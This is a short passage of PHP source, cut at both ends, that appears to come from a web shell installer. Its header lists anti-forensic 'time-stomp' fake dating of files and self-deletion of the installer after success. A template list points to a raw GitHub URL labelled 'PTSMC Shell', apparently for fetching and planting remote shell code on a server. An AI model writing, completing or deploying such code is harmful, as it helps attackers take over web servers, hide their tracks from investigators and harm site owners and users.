 * 2. Time-Stomp (Anti-Forensic / Fake Date)
 * 3. Self-Destruct (Delete Installer after success)
 */

$msg = "";
$msg_class = "";

// --- PRESET TEMPLATES ---
$templates = [
    "" => "-- Select Module Template --",
    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: PTSMC Shell",
